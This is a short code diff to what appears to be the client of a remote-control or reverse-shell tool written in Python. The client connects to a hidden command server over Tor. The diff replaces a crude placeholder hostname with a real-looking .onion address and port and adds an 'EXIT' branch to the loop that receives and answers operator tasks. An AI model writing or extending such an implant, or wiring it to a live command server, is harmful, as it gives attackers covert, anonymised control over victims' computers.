@@ -3,8 +3,8 @@ from argparse import ArgumentParser
 import tasks
 
 
-onion = "penis.onion"
-port = 187
+onion = "mzdaxxejpx6yy47nifqvul44dfh6klhnmdsqmxakkrcabue2tjlb36ad.onion"
+port = 8843
 
 
 class Client:
@@ -34,6 +34,8 @@ class Client:
 				# no empty string gets send because the client
 				# sends back the cwd everytime anyways.
 				self.__sock.send('')
+			elif task == 'EXIT':
+				continue
 			else:
 				self.__sock.send('Unknown command')
 
